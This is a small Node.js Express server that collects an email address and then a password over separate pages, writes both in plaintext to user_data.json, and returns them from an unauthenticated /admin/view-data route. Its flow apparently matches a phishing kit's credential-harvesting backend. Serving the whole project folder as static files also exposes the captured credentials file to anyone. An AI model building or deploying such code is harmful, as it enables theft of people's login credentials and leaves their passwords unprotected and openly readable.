const express = require('express');
const fs = require('fs');
const path = require('path');
const app = express();
const port = 3000;

// Initialize userData
let userData = {};

// Middleware to parse URL-encoded bodies (from form submissions)
app.use(express.urlencoded({ extended: true }));

// Serve static files (CSS, images) from the root directory
app.use('/images', express.static(path.join(__dirname, 'images')));
app.use(express.static(__dirname));

// Route for the index page
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

// Route for login page
app.get('/login', (req, res) => {
    res.sendFile(path.join(__dirname, 'login.html'));
});

// Route for email login page
app.get('/email_login', (req, res) => {
    res.sendFile(path.join(__dirname, 'email_login.html'));
});

// Route for password page
app.get('/password', (req, res) => {
    res.sendFile(path.join(__dirname, 'password.html'));
});

// Route for confirmation page
app.get('/confirmation', (req, res) => {
    res.sendFile(path.join(__dirname, 'confirmation.html'));
});

// Route to store email
app.post('/store_email', (req, res) => {
    const email = req.body.email;
    userData.email = email; // Update userData
    fs.writeFile('user_data.json', JSON.stringify(userData), err => {
        if (err) {
            res.status(500).send('Error saving email');
            return;
        }
        res.redirect('/password');
    });
});

// Route to store password
app.post('/store_password', (req, res) => {
    const password = req.body.password;
    fs.readFile('user_data.json', (err, data) => {
        if (err) {
            res.status(500).send('Error reading email');
            return;
        }
        userData = JSON.parse(data); // Update userData with email from file
        userData.password = password;
        fs.writeFile('user_data.json', JSON.stringify(userData), err => {
            if (err) {
                res.status(500).send('Error saving password');
                return;
            }
            res.redirect('/confirmation');
        });
    });
});

app.get('/admin/view-data', (req, res) => {
    // Ensure this route is protected in a real app
    res.json(userData);
});

// Start the server
app.listen(port, () => {
    console.log(`Server running at http://localhost:${port}/`);
});

